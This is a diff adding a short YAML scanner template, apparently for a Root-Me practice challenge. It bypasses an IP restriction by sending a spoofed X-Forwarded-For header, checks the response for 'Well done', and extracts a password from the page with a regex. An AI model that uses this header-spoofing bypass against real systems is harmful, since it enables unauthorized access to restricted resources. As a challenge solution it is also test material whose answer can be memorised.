@@ -1,0 +1,32 @@
+id: HTTP-IP_restriction_bypass
+
+info:
+  name: HTTP IP restriction bypass
+  description: IP restriction bypass
+  author: Tomitom13
+  severity: unknown
+  tags: ip,http,rootme
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      X-Forwarded-For: "192.168.1.1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Well done"
+        part: body
+
+    extractors:
+      - type: regex
+        name: password
+        part: body
+        regex:
+          - "I(.*?)g"
